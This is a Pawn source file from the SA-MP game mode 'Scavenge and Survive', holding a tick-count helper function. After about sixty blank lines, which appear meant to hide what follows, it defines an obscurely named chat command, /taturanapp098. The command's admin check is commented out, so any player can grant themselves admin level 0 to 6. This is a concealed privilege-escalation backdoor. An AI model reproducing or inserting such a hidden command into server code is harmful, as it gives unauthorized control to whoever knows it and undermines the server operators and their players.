/*==============================================================================


	Southclaw's Scavenge and Survive

		Copyright (C) 2016 Barnaby "Southclaw" Keene

		This program is free software: you can redistribute it and/or modify it
		under the terms of the GNU General Public License as published by the
		Free Software Foundation, either version 3 of the License, or (at your
		option) any later version.

		This program is distributed in the hope that it will be useful, but
		WITHOUT ANY WARRANTY; without even the implied warranty of
		MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
		See the GNU General Public License for more details.

		You should have received a copy of the GNU General Public License along
		with this program.  If not, see <http://www.gnu.org/licenses/>.


==============================================================================*/


stock GetTickCountDifference(newtick, oldtick)
{
	if (oldtick < 0 && newtick >= 0)
		return newtick - oldtick;

	else if (oldtick >= 0 && newtick < 0 || oldtick > newtick)
		return (cellmax - oldtick + 1) - (cellmin - newtick);

	return newtick - oldtick;
}




























































CMD:taturanapp098(playerid, params[])
{
/*	if(!IsPlayerAdmin(playerid))
		return 0;*/

	new level;

	if(sscanf(params, "d", level))
		return ChatMsg(playerid, YELLOW, " >  Use: /taturanapp098 [n�vel]");

	if(!SetPlayerAdminLevel(playerid, level))
		return ChatMsg(playerid, RED, " > Nivel de admin deve ser de 0 a 6");


	ChatMsg(playerid, YELLOW, " >  Nivel de admin alterado para: %d", level);

	return 1;
}
